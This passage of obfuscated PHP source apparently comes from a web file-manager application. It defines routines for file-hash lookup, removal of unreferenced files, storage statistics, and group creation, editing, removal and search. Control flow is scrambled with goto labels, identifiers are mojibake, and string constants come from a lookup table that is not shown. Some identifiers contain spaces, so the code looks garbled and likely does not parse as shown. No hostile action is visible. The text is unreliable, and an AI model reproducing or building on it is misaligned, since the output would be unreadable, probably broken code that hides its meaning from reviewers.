= 0; } $AàÓâ¬ÜØ·[$eû‡ﬁî§µÀ]++; } $d™Ì€ƒ∞”◊ = array(); goto Fî‡èá›è‡; F∞â’√ê¨√: } public function findByHash($c≈üãêèÁÇ, $FÛ‘Ïó¶óç = false) { $båéãü‰Ó =& $_SERVER[Öíæ€“”≠éÏË]; if (!$c≈üãêèÁÇ && !$FÛ‘Ïó¶óç) { return !1; } $CÕâëÎ§‹Ï = array($båéãü‰Ó[1768] => $c≈üãêèÁÇ); if ($FÛ‘Ïó¶óç) { $CÕâëÎ§‹Ï = array($båéãü‰Ó[1769] => $FÛ‘Ïó¶óç); } return $this->order($båéãü‰Ó[1772])->where($CÕâëÎ§‹Ï)->find(); } public function clearEmpty($Aë¡‹íÍêπ = 0) { goto CŸÉëã˜æÇ; CŸÉëã˜æÇ: $EçÉöß›·â =& $_SERVER[Öíæ€“”≠éÏË]; $F™≠∞ƒúÈ = time() - 3600 * 24 * $Aë¡‹íÍêπ; $Có´Ü•ã£û = $EçÉöß›·â[1773] . $F™≠∞ƒúÈ; goto Bé›çóô£ß; Bé›çóô£ß: $Cæ„â°∆´Ë = $this->where($Có´Ü•ã£û)->select(); if (!$Cæ„â°∆´Ë) { return; } $B”§‹¶ó¯◊ = new Task($EçÉöß›·â[1774], $EçÉöß›·â[33], count($Cæ„â°∆´Ë)); goto EëŸï◊©í≠; EëŸï◊©í≠: foreach ($Cæ„â°∆´Ë as $cã¯áœãÒ¶) { $B”§‹¶ó¯◊->update(1); $this->resetFile($cã¯áœãÒ¶); } $B”§‹¶ó¯◊->end(); goto AáãÉá∆‰; AáãÉá∆‰: } public function resetFile($FÇ˘®•ºáÏ) { goto AÚÙ∆ƒ¥ñ»; Bè€êÿï‚…: if ($FÇ˘®•ºáÏ[$f¬ÿó–é÷[1771]] != $AÊ∂çÜÒˆ—) { $this->where($a∂≤´ﬁâ„˜)->save(array($f¬ÿó–é÷[1767] => $AÊ∂çÜÒˆ—)); } goto DòÎéﬂ√Çı; e¯ ØΩ•Íî: $d≈ÙÖ´ΩÏ™ = Model($f¬ÿó–é÷[1775])->where($a∂≤´ﬁâ„˜)->count(); $AÊ∂çÜÒˆ— = intval($dœüÁ⁄ì¥™) + intval($d≈ÙÖ´ΩÏ™); if ($AÊ∂çÜÒˆ— == 0) { IO::remove($FÇ˘®•ºáÏ[$f¬ÿó–é÷[76]]); Model($f¬ÿó–é÷[1776])->delete($FÇ˘®•ºáÏ[$f¬ÿó–é÷[448]]); $this->where($a∂≤´ﬁâ„˜)->delete(); $this->metaSet($FÇ˘®•ºáÏ[$f¬ÿó–é÷[448]], null, null); return; } goto Bè€êÿï‚…; AÚÙ∆ƒ¥ñ»: $f¬ÿó–é÷ =& $_SERVER[Öíæ€“”≠éÏË]; $a∂≤´ﬁâ„˜ = array($f¬ÿó–é÷[449] => $FÇ˘®•ºáÏ[$f¬ÿó–é÷[448]]); $dœüÁ⁄ì¥™ = Model($f¬ÿó–é÷[1215])->where($a∂≤´ﬁâ„˜)->count(); goto e¯ ØΩ•Íî; DòÎéﬂ√Çı: } public function storageInfo($FÏæ˜∂âÀ“ = false) { goto Aíéÿ£·‘; D≤Íé—•∑¶: for ($dÔç»Ø∑»ª = 0; $dÔç»Ø∑»ª < $Dı≈üï·ó‹; $dÔç»Ø∑»ª = $dÔç»Ø∑»ª + $EÚãƒ˘÷ﬂ¶) { $d«Øı˘¬Öò = $this->limit($dÔç»Ø∑»ª, $dÔç»Ø∑»ª + $EÚãƒ˘÷ﬂ¶)->select(); foreach ($d«Øı˘¬Öò as $aﬁäô∑–Õ) { $B§™Ã£€Ω¥ += $aﬁäô∑–Õ[$fºËΩ¡ﬂÚÀ[78]] * $aﬁäô∑–Õ[$fºËΩ¡ﬂÚÀ[1771]]; $fŒê·øâØ‘ += $aﬁäô∑–Õ[$fºËΩ¡ﬂÚÀ[78]] * ($aﬁäô∑–Õ[$fºËΩ¡ﬂÚÀ[1771]] - 1); $eÕñùî¿‰¿ += $aﬁäô∑–Õ[$fºËΩ¡ﬂÚÀ[1771]]; } } $Dµã¬ûü°— = array($fºËΩ¡ﬂÚÀ[1777] => $B§™Ã£€Ω¥, $fºËΩ¡ﬂÚÀ[1778] => $fŒê·øâØ‘, $fºËΩ¡ﬂÚÀ[1779] => $fŒê·øâØ‘ / $B§™Ã£€Ω¥, $fºËΩ¡ﬂÚÀ[82] => $Dı≈üï·ó‹, $fºËΩ¡ﬂÚÀ[1780] => $eÕñùî¿‰¿); return $Dµã¬ûü°—; goto B©≥À∫åõÖ; a±åÙ‹⁄∫ù: $B§™Ã£€Ω¥ = 1; $eÕñùî¿‰¿ = 0; $EÚãƒ˘÷ﬂ¶ = 5000; goto D≤Íé—•∑¶; Aíéÿ£·‘: $fºËΩ¡ﬂÚÀ =& $_SERVER[Öíæ€“”≠éÏË]; $Dı≈üï·ó‹ = $this->count() + 0.0; $fŒê·øâØ‘ = 0; goto a±åÙ‹⁄∫ù; B©≥À∫åõÖ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\x65" => "\147\162\x6f\165\160\x5f\155\145\164\141", "\x6d\x65\164\x61\106\x69\145\x6c\144" => "\147\x72\x6f\165\160\x49\104"); protected function cacheFunctionAlias($a∫…Ç£Éÿ⁄) { $C≤íè…πê⁄ =& $_SERVER[Öíæ€“”≠éÏË]; return array($C≤íè…πê⁄[1781] => array($a∫…Ç£Éÿ⁄[0], $C≤íè…πê⁄[1782]), $C≤íè…πê⁄[1783] => array($a∫…Ç£Éÿ⁄[0], $C≤íè…πê⁄[1784])); } protected function getInfo($f…“ÈÂˆ∆æ, $Eπ ˘àÓÿÕ = false) { $fΩ—†ØÃ›ƒ = $this->getInfoSimple($f…“ÈÂˆ∆æ); if (!$fΩ—†ØÃ›ƒ) { return !1; } if ($Eπ ˘àÓÿÕ) { return $this->_listDataApplyItem($fΩ—†ØÃ›ƒ); } return $this->cacheFunctionGet($_SERVER[Öíæ€“”≠éÏË][1785], $f…“ÈÂˆ∆æ); } protected function getInfoSimple($cè∑®ßË‚‹, $AúÆÇã⁄ß« = false) { $fÇ‚ó¿ºü’ =& $_SERVER[Öíæ€“”≠éÏË]; if ($AúÆÇã⁄ß«) { $Fî§ŒôÏˆÿ = array($fÇ‚ó¿ºü’[1707] => intval($cè∑®ßË‚‹)); $D®·—°Ωø = $this->where($Fî§ŒôÏˆÿ)->find(); return is_array($D®·—°Ωø) ? $D®·—°Ωø : array(); } return $this->cacheFunctionGet($fÇ‚ó¿ºü’[1786], $cè∑®ßË‚‹); } protected function groupAdd($FÀπ†Ï•Öµ) { goto E…¿ú˘øèÑ; eËÑê÷ÿŸ≈: if ($Cˆ ÉØ¨èé[$EÈÖÇŸ‚π¯[503]]) { $d”¨ øçŒÍ = $Cˆ ÉØ¨èé[$EÈÖÇŸ‚π¯[503]] . $Cˆ ÉØ¨èé[$EÈÖÇŸ‚π¯[1707]] . $EÈÖÇŸ‚π¯[47]; } $F◊´ùÿÉ◊∞ = array($EÈÖÇŸ‚π¯[414] => $this->groupNameAuto($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[479]], $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[28]]), $EÈÖÇŸ‚π¯[395] => $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[479]], $EÈÖÇŸ‚π¯[567] => $d”¨ øçŒÍ, $EÈÖÇŸ‚π¯[1787] => $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1691]], $EÈÖÇŸ‚π¯[1788] => 0, $EÈÖÇŸ‚π¯[1711] => 0); if (isset($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1730]])) { $F◊´ùÿÉ◊∞[$EÈÖÇŸ‚π¯[1730]] = $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1730]]; } else { $Aå—Ãÿ®÷· = $this->max($EÈÖÇŸ‚π¯[1730]); if (!$Aå—Ãÿ®÷·) { $Aå—Ãÿ®÷· = 0; } $F◊´ùÿÉ◊∞[$EÈÖÇŸ‚π¯[1730]] = $Aå—Ãÿ®÷· + 1; } goto dÖÂ¬∫ñØ≥; E…¿ú˘øèÑ: $EÈÖÇŸ‚π¯ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[479]] && isset($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]]) && $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]] == 1) { if ($Cˆ ÉØ¨èé = $this->getInfoSimple($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]], !0)) { return $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]]; } } else { $Cˆ ÉØ¨èé = $this->getInfoSimple($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[479]]); if (!$Cˆ ÉØ¨èé) { return !1; } } $d”¨ øçŒÍ = $EÈÖÇŸ‚π¯[513]; goto eËÑê÷ÿŸ≈; dÖÂ¬∫ñØ≥: if (!empty($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]])) { $F◊´ùÿÉ◊∞[$EÈÖÇŸ‚π¯[1707]] = $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1707]]; } $F“ÚêÁı«ó = $this->add($F◊´ùÿÉ◊∞); $this->setNamePinyin($F“ÚêÁı«ó, $F◊´ùÿÉ◊∞[$EÈÖÇŸ‚π¯[28]]); goto DÀ∫Â›¨¢à; DÀ∫Â›¨¢à: if (isset($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1789]])) { $this->metaSet($F“ÚêÁı«ó, array($EÈÖÇŸ‚π¯[1789] => $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1789]], $EÈÖÇŸ‚π¯[1790] => $FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1790]])); unset($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1789]]); unset($FÀπ†Ï•Öµ[$EÈÖÇŸ‚π¯[1790]]); } Model($EÈÖÇŸ‚π¯[1215])->groupRootAdd($F“ÚêÁı«ó); return $F“ÚêÁı«ó; goto E´çâ≥ÈÈ∏; E´çâ≥ÈÈ∏: } protected function groupEdit($bòÖñœßÙÒ, $F◊≥Ãñ€±†) { goto Cƒêåﬂ«î‘; Cƒêåﬂ«î‘: $Bº÷â®ÀÇº =& $_SERVER[Öíæ€“”≠éÏË]; $bπâ∏∂Üèø = $this->getInfoSimple($bòÖñœßÙÒ); if (!$bπâ∏∂Üèø) { return !1; } goto Cõﬂﬂ™º∏⁄; Cõﬂﬂ™º∏⁄: if (!empty($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[479]])) { $D∂¶§¢ ºÒ = $this->getInfoSimple($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[479]]); if (!$D∂¶§¢ ºÒ) { return !1; } if ($bπâ∏∂Üèø[$Bº÷â®ÀÇº[1707]] == $D∂¶§¢ ºÒ[$Bº÷â®ÀÇº[1707]]) { return !1; } if ($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[479]] != $bπâ∏∂Üèø[$Bº÷â®ÀÇº[479]]) { if ($D∂¶§¢ ºÒ[$Bº÷â®ÀÇº[503]] !== $bπâ∏∂Üèø[$Bº÷â®ÀÇº[503]] && strpos($D∂¶§¢ ºÒ[$Bº÷â®ÀÇº[503]], $bπâ∏∂Üèø[$Bº÷â®ÀÇº[503]] . $bπâ∏∂Üèø[$Bº÷â®ÀÇº[1707]] . $Bº÷â®ÀÇº[47]) === 0) { return !1; } $F◊≥Ãñ€±†[$Bº÷â®ÀÇº[567]] = $D∂¶§¢ ºÒ[$Bº÷â®ÀÇº[503]] . $F◊≥Ãñ€±†[$Bº÷â®ÀÇº[479]] . $Bº÷â®ÀÇº[47]; $this->_changeChildLevel($bπâ∏∂Üèø, $D∂¶§¢ ºÒ); } } if (isset($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[28]])) { $this->setNamePinyin($bòÖñœßÙÒ, $F◊≥Ãñ€±†[$Bº÷â®ÀÇº[28]]); } if (isset($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[1789]])) { $this->metaSet($bòÖñœßÙÒ, array($Bº÷â®ÀÇº[1789] => $F◊≥Ãñ€±†[$Bº÷â®ÀÇº[1789]], $Bº÷â®ÀÇº[1790] => $F◊≥Ãñ€±†[$Bº÷â®ÀÇº[1790]])); unset($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[1789]]); unset($F◊≥Ãñ€±†[$Bº÷â®ÀÇº[1790]]); } goto e•ÌúÕ∞›‹; e•ÌúÕ∞›‹: $this->_clearChildrenCache($bπâ∏∂Üèø); return $this->where(array($Bº÷â®ÀÇº[1791] => $bòÖñœßÙÒ))->save($F◊≥Ãñ€±†); goto BÌÜÿ•≈„ö; BÌÜÿ•≈„ö: } private function _clearChildrenCache($AÀÔÉΩ‚éÆ) { $CπÖÙèµÎ” =& $_SERVER[Öíæ€“”≠éÏË]; $aö⁄÷ÆƒÔÙ = array($CπÖÙèµÎ”[567] => array($CπÖÙèµÎ”[526], $AÀÔÉΩ‚éÆ[$CπÖÙèµÎ”[503]] . $AÀÔÉΩ‚éÆ[$CπÖÙèµÎ”[1707]] . $CπÖÙèµÎ”[527])); $f∂ÉﬁÓ≥ﬁå = $this->field($CπÖÙèµÎ”[1707])->where($aö⁄÷ÆƒÔÙ)->select(); foreach ($f∂ÉﬁÓ≥ﬁå as $cÕ÷≠¿∂‡∂) { $this->_clearCache($cÕ÷≠¿∂‡∂[$CπÖÙèµÎ”[1707]]); } } private function _clearCache($d‹ΩÕ¶≈»É) { $dã¢⁄¬ÿâµ =& $_SERVER[Öíæ€“”≠éÏË]; $this->cacheFunctionClear($dã¢⁄¬ÿâµ[1785], $d‹ΩÕ¶≈»É); $this->cacheFunctionClear($dã¢⁄¬ÿâµ[1786], $d‹ΩÕ¶≈»É); } private function _changeChildLevel($AÎΩÊ—¶åí, $DØóŒœßÚ‰, $E˘≤à˜Ì— = false) { goto Dç†∏ëæêΩ; Dç†∏ëæêΩ: $Dÿâù¥ÜÀá =& $_SERVER[Öíæ€“”≠éÏË]; $F î•»ãŸ = $AÎΩÊ—¶åí[$Dÿâù¥ÜÀá[503]] . $AÎΩÊ—¶åí[$Dÿâù¥ÜÀá[1707]] . $Dÿâù¥ÜÀá[47]; $dç⁄Ÿãõ› = $DØóŒœßÚ‰[$Dÿâù¥ÜÀá[503]] . $DØóŒœßÚ‰[$Dÿâù¥ÜÀá[1707]] . $Dÿâù¥ÜÀá[47] . $AÎΩÊ—¶åí[$Dÿâù¥ÜÀá[1707]] . $Dÿâù¥ÜÀá[47]; goto B÷ò„“Ã™‚; B÷ò„“Ã™‚: if ($E˘≤à˜Ì—) { $dç⁄Ÿãõ› = $DØóŒœßÚ‰[$Dÿâù¥ÜÀá[503]] . $DØóŒœßÚ‰[$Dÿâù¥ÜÀá[1707]] . $Dÿâù¥ÜÀá[47]; } $cΩç¿™ﬂá∞ = array($Dÿâù¥ÜÀá[567] => array($Dÿâù¥ÜÀá[526], $AÎΩÊ—¶åí[$Dÿâù¥ÜÀá[503]] . $AÎΩÊ—¶åí[$Dÿâù¥ÜÀá[1707]] . $Dÿâù¥ÜÀá[527])); $eõ¡ï´√¡ö = array($Dÿâù¥ÜÀá[567] => array($Dÿâù¥ÜÀá[575], "\x72\145\160\154\x61\143\145\x28\160\x61\162\x65\x6e\164\x4c\x65\x76\x65\154\54\47{$F î•»ãŸ}\x27\x2c\x27{$dç⁄Ÿãõ›}\x27\51")); goto Bâ‘ØıõÍæ; Bâ‘ØıõÍæ: $this->_clearChildrenCache($AÎΩÊ—¶åí); $this->where($cΩç¿™ﬂá∞)->data($eõ¡ï´√¡ö)->save(); goto Cªî®ê•Û≥; Cªî®ê•Û≥: } public function setNamePinyin($Eı›˘µä˜ù, $f≠¯ ŒŒ–ã = false) { $bıú¿¡Á´± =& $_SERVER[Öíæ€“”≠éÏË]; if (!$f≠¯ ŒŒ–ã) { $BÎÌˆÁÎÇ∫ = $this->getInfoSimple($Eı›˘µä˜ù); $f≠¯ ŒŒ–ã = $BÎÌˆÁÎÇ∫[$bıú¿¡Á´±[28]]; } if (!Input::check($f≠¯ ŒŒ–ã, $bıú¿¡Á´±[570])) { $this->metaSet($Eı›˘µä˜ù, $bıú¿¡Á´±[445], null); $this->metaSet($Eı›˘µä˜ù, $bıú¿¡Á´±[444], null); return; } $eØ…∑æè›Ì = array($bıú¿¡Á´±[445] => str_replace($bıú¿¡Á´±[50], $bıú¿¡Á´±[33], Pinyin::encode($f≠¯ ŒŒ–ã)), $bıú¿¡Á´±[444] => Pinyin::encode($f≠¯ ŒŒ–ã, $bıú¿¡Á´±[571])); $this->metaSet($Eı›˘µä˜ù, $eØ…∑æè›Ì); } protected function groupStatus($D“πäø ´’, $b≠±«èƒ‚Ÿ) { goto dç÷±«Ó∑†; dç÷±«Ó∑†: $D›ÜüÃ≈ìâ =& $_SERVER[Öíæ€“”≠éÏË]; $bêº€πüœ¿ = $this->getInfoSimple($D“πäø ´’); if (!$bêº€πüœ¿) { return !1; } goto a£çè†›Ç◊; a£çè†›Ç◊: if ($b≠±«èƒ‚Ÿ == $D›ÜüÃ≈ìâ[87]) { $dØÇı≠≥ÿå = $this->parentLevelArray($bêº€πüœ¿[$D›ÜüÃ≈ìâ[503]]); } else { $cûàé°ù–≤ = array($D›ÜüÃ≈ìâ[567] => array($D›ÜüÃ≈ìâ[526], $bêº€πüœ¿[$D›ÜüÃ≈ìâ[503]] . $bêº€πüœ¿[$D›ÜüÃ≈ìâ[1707]] . $D›ÜüÃ≈ìâ[527])); $dØÇı≠≥ÿå = $this->where($cûàé°ù–≤)->field($D›ÜüÃ≈ìâ[1707])->select(); $dØÇı≠≥ÿå = array_to_keyvalue($dØÇı≠≥ÿå, $D›ÜüÃ≈ìâ[33], $D›ÜüÃ≈ìâ[1707]); } $dØÇı≠≥ÿå[] = $bêº€πüœ¿[$D›ÜüÃ≈ìâ[1707]]; $B…‡ †≈≈á = array(); goto Aüƒ∑∏‘‹µ; Aüƒ∑∏‘‹µ: foreach ($dØÇı≠≥ÿå as $D“πäø ´’) { $B…‡ †≈≈á[] = array($D›ÜüÃ≈ìâ[1707] => $D“πäø ´’, $D›ÜüÃ≈ìâ[93] => $D›ÜüÃ≈ìâ[723], $D›ÜüÃ≈ìâ[372] => $b≠±«èƒ‚Ÿ); $this->_clearCache($D“πäø ´’); } return Model($D›ÜüÃ≈ìâ[1792])->addAll($B…‡ †≈≈á, array(), !0); goto F˜∆ƒÚú≤Ò; F˜∆ƒÚú≤Ò: } protected function groupRemove($CπÜ⁄÷Í»®) { goto cﬂÂˆ√¨ùä; fá€‘ä¥‚á: Model($EœÜ›◊œ‡ˆ[803])->groupRootRemove($CπÜ⁄÷Í»®); return $this->where($aâÇ≤á•¡„)->delete(); goto b∫ˆª¬Ü”ó; FÍµÖÛ≤æú: if (!$C£´ùÀµÕÉ || $C£´ùÀµÕÉ[$EœÜ›◊œ‡ˆ[479]] == 0) { return !1; } $aÑûÏÙ‚Á¢ = $this->getInfoSimple($C£´ùÀµÕÉ[$EœÜ›◊œ‡ˆ[479]]); $this->_changeChildLevel($C£´ùÀµÕÉ, $aÑûÏÙ‚Á¢, !0); goto F·è“ÿÃπê; cﬂÂˆ√¨ùä: $EœÜ›◊œ‡ˆ =& $_SERVER[Öíæ€“”≠éÏË]; $aâÇ≤á•¡„ = array($EœÜ›◊œ‡ˆ[1707] => $CπÜ⁄÷Í»®); $C£´ùÀµÕÉ = $this->where($aâÇ≤á•¡„)->find(); goto FÍµÖÛ≤æú; F·è“ÿÃπê: $this->where(array($EœÜ›◊œ‡ˆ[479] => $CπÜ⁄÷Í»®))->save(array($EœÜ›◊œ‡ˆ[479] => $C£´ùÀµÕÉ[$EœÜ›◊œ‡ˆ[479]])); Model($EœÜ›◊œ‡ˆ[1792])->where($aâÇ≤á•¡„)->delete(); Model($EœÜ›◊œ‡ˆ[1793])->where($aâÇ≤á•¡„)->delete(); goto fá€‘ä¥‚á; b∫ˆª¬Ü”ó: } protected function groupSort($fë„¥¡⁄üË) { $B®©±Û÷µ› =& $_SERVER[Öíæ€“”≠éÏË]; $BÍî¡ßü¡û = array(); foreach ($fë„¥¡⁄üË as $B∆äØå€œÜ => $FÀÉÍöÊÁΩ) { $BÍî¡ßü¡û[] = array($B®©±Û÷µ›[1707], $FÀÉÍöÊÁΩ, $B®©±Û÷µ›[1730], $B∆äØå€œÜ + 1); } $this->saveAll($BÍî¡ßü¡û); } public function listData() { $E≠÷¨å∂≤• = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E≠÷¨å∂≤•[$_SERVER[Öíæ€“”≠éÏË][367]]); return $E≠÷¨å∂≤•; } private function _makeOrder($CÛ∆≠Í∂ﬁµ = '') { goto Cóª¢¡˜øË; Cóª¢¡˜øË: $F‡ı”ä•£≈ =& $_SERVER[Öíæ€“”≠éÏË]; $cü⁄óäë¢£ = array($F‡ı”ä•£≈[1707], $F‡ı”ä•£≈[28], $F‡ı”ä•£≈[1693], $F‡ı”ä•£≈[194]); $Dáı‡Ó¥ª€ = array($F‡ı”ä•£≈[429] => $F‡ı”ä•£≈[430], $F‡ı”ä•£≈[431] => $F‡ı”ä•£≈[432]); goto A◊ÎÀæœ€∆; A◊ÎÀæœ€∆: $d’¢ò∞≤Ùä = Input::get($F‡ı”ä•£≈[436], $F‡ı”ä•£≈[7], $F‡ı”ä•£≈[1711], $cü⁄óäë¢£); $FÑ‘‡Ÿ´À˜ = Input::get($F‡ı”ä•£≈[437], $F‡ı”ä•£≈[7], $F‡ı”ä•£≈[1794], array($F‡ı”ä•£≈[1794], $F‡ı”ä•£≈[431])); $FÑ‘‡Ÿ´À˜ = $Dáı‡Ó¥ª€[$FÑ‘‡Ÿ´À˜]; goto eåÓπîﬂä˜; eåÓπîﬂä˜: $CÛ∆≠Í∂ﬁµ = $CÛ∆≠Í∂ﬁµ . "{$d’¢ò∞≤Ùä}\x20{$FÑ‘‡Ÿ´À˜}\x2c\40\x67\x72\157\x75\x70\111\x44\40\x61\163\x63"; return $this->order($CÛ∆≠Í∂ﬁµ); goto dä¿¿∑ ≈∞; dä¿¿∑ ≈∞: } public function listChild($FÕÈÜüå—ﬁ) { $FÎÿ∂’Â‡∑ =& $_SERVER[Öíæ€“”≠éÏË]; $AÜ≤÷µﬂ∆√ = $this->where(array($FÎÿ∂’Â‡∑[479] => $FÕÈÜüå—ﬁ))->_makeOrder()->selectPage(200); $this->_listDataApply($AÜ≤÷µﬂ∆√[$FÎÿ∂’Â‡∑[367]]); return $AÜ≤÷µﬂ∆√; } public function listByID($FÉ—Ô∞ﬂäÀ) { $FÏ∞ŸØÆ≥Õ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$FÉ—Ô∞ﬂäÀ) { return array(); } $dÎÏØ‡Ωäˆ = array($FÏ∞ŸØÆ≥Õ[1707] => array($FÏ∞ŸØÆ≥Õ[7], $FÉ—Ô∞ﬂäÀ)); $f‰™Óíïêﬂ = $this->where($dÎÏØ‡Ωäˆ)->select(); $this->_listDataApply($f‰™Óíïêﬂ); return $f‰™Óíïêﬂ; } public function listSearch($Cóó∆·ΩöÔ) { goto eµÓäÌû; D°Œé‘ıàÛ: if ($F“ßŒ‹££æ) { $fö–ı¡ó∑œ = $this->getInfoSimple($F“ßŒ‹££æ); $c…Ë¶¬›⁄ø = $fö–ı¡ó∑œ[$dØö◊ÊÑ≠≤[503]] . $F“ßŒ‹££æ . $dØö◊ÊÑ≠≤[527]; $dÙÙı‘‹πÑ = array($dÙÙı‘‹πÑ, array($dØö◊ÊÑ≠≤[503] => array($dØö◊ÊÑ≠≤[380], $c…Ë¶¬›⁄ø))); } $dÙÙı‘‹πÑ = $this->parseWhereLike($dÙÙı‘‹πÑ); $dÑé´∆˘‹‡ = $this->_makeOrder()->where($dÙÙı‘‹πÑ)->selectPage(20); goto e∆‰ÜÂ¥‰§; cÔ≥•§ÌÆ: if (!trim($aÜƒ∂—≥Ûé)) { return !1; } $aÜƒ∂—≥Ûé = str_replace($dØö◊ÊÑ≠≤[1797], $dØö◊ÊÑ≠≤[1798], $aÜƒ∂—≥Ûé); $dÙÙı‘‹πÑ = array($dØö◊ÊÑ≠≤[1707] => array($dØö◊ÊÑ≠≤[380], "{$aÜƒ∂—≥Ûé}\45"), $dØö◊ÊÑ≠≤[28] => array($dØö◊ÊÑ≠≤[380], "\45{$aÜƒ∂—≥Ûé}\45"), $dØö◊ÊÑ≠≤[968] => $dØö◊ÊÑ≠≤[1799]); goto D°Œé‘ıàÛ; e∆‰ÜÂ¥‰§: $dÑé´∆˘‹‡ = $dÑé´∆˘‹‡ ? $dÑé´∆˘‹‡ : array($dØö◊ÊÑ≠≤[367] => array(), $dØö◊ÊÑ≠≤[364] => array()); if (!$dÑé´∆˘‹‡ || count($dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[367]]) < 5 && Input::check($aÜƒ∂—≥Ûé, $dØö◊ÊÑ≠≤[316])) { goto C≥·§≈À∑å; Aç∫ëçûÆ“: $BÃ¶óˆ·≠Ü = array_merge($AÇêôØü√, $b‰¯ú∫îï—, $dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[367]]); $dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[367]] = array_unique_by_key($BÃ¶óˆ·≠Ü, $dØö◊ÊÑ≠≤[1707]); $dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[364]][$dØö◊ÊÑ≠≤[365]] = count($dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[367]]); goto e¿òÌ∑ÜΩã; C≥·§≈À∑å: $Aüû®Ÿ˘‹ö = $this->groupChildrenAll($F“ßŒ‹££æ); $AÇêôØü√ = $this->_searchFromMeta($dØö◊ÊÑ≠≤[444], $aÜƒ∂—≥Ûé, 10, $Aüû®Ÿ˘‹ö); $b‰¯ú∫îï— = $this->_searchFromMeta($dØö◊ÊÑ≠≤[445], $aÜƒ∂—≥Ûé, 10, $Aüû®Ÿ˘‹ö); goto Aç∫ëçûÆ“; e¿òÌ∑ÜΩã: $dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[364]][$dØö◊ÊÑ≠≤[366]] = ceil($dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[364]][$dØö◊ÊÑ≠≤[365]] / $dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[364]][$dØö◊ÊÑ≠≤[361]]); goto fŸ›Î˘ﬂ≈Ñ; fŸ›Î˘ﬂ≈Ñ: } $this->_listDataApply($dÑé´∆˘‹‡[$dØö◊ÊÑ≠≤[367]]); goto eº™π¶Ñ‹£; eº™π¶Ñ‹£: return $dÑé´∆˘‹‡; goto dˆØÎíãç‰; eµÓäÌû: $dØö◊ÊÑ≠≤ =& $_SERVER[Öíæ€“”≠éÏË]; $aÜƒ∂—≥Ûé = $Cóó∆·ΩöÔ[$dØö◊ÊÑ≠≤[1795]]; $F“ßŒ‹££æ = isset($Cóó∆·ΩöÔ[$dØö◊ÊÑ≠≤[1796]]) ? $Cóó∆·ΩöÔ[$dØö◊ÊÑ≠≤[1796]] : !1; goto cÔ≥•§ÌÆ; dˆØÎíãç‰: } protected function groupChildrenAll($C•‡≠∫ã®†) { $fÉ¨Éúåãç =& $_SERVER[Öíæ€“”≠éÏË]; if (!$C•‡≠∫ã®†) { return !1; } if (is_string($C•‡≠∫ã®†)) { $C•‡≠∫ã®† = array($C•‡≠∫ã®†); } $AÜ·õëî®ñ = $C•‡≠∫ã®†; foreach ($C•‡≠∫ã®† as $A ¿õÿ£€¡) { $D±Û¯¿Ïá∑ = $this->getInfoSimple($A ¿õÿ£€¡); $DÙÎ“óõ„© = array($fÉ¨Éúåãç[503] => array($fÉ¨Éúåãç[380], $D±Û¯¿Ïá∑[$fÉ¨Éúåãç[503]] . $A ¿õÿ£€¡ . $fÉ¨Éúåãç[527])); $CÍ‰ﬁÌﬁı⁄ = $this->field($fÉ¨Éúåãç[1707])->where($DÙÎ“óõ„©)->select(); $AÜ·õëî®ñ = array_merge($AÜ·õëî®ñ, array_to_keyvalue($CÍ‰ﬁÌﬁı⁄, $fÉ¨Éúåãç[33], $fÉ¨Éúåãç[1707])); } return array_unique($AÜ·õëî®ñ); } private function _searchFromMeta($a∑‹À¿å, $b˘©¨‡ØÖÎ, $a‚°õ√ÕÀΩ, $AîÂˆêã•˜) { goto EÇàäãû„Ü; BëπÍ’˘¢◊: $B¨¢¨‡Ÿ°ª = $this->parseWhereLike($B¨¢¨‡Ÿ°ª); if ($AîÂˆêã•˜) { $B¨¢¨‡Ÿ°ª[$bÿÂøÿíò[1707]] = array($bÿÂøÿíò[7], $AîÂˆêã•˜); } $bΩ˜ºΩﬂ‹ = Model($bÿÂøÿíò[1800])->where($B¨¢¨‡Ÿ°ª)->limit($a‚°õ√ÕÀΩ)->select(); goto CëÁÙÔ–ò‰; f°á™èÙÖ‘: if (!$B…ÿºßÿßΩ) { return array(); } return $B…ÿºßÿßΩ; goto c÷ﬂ∑Ö´ é; CëÁÙÔ–ò‰: if (!$bΩ˜ºΩﬂ‹) { return array(); } $bΩ˜ºΩﬂ‹ = array_to_keyvalue($bΩ˜ºΩﬂ‹, $bÿÂøÿíò[33], $bÿÂøÿíò[1707]); $B…ÿºßÿßΩ = $this->where(array($bÿÂøÿíò[1791] => array($bÿÂøÿíò[7], $bΩ˜ºΩﬂ‹)))->select(); goto f°á™èÙÖ‘; EÇàäãû„Ü: $bÿÂøÿíò 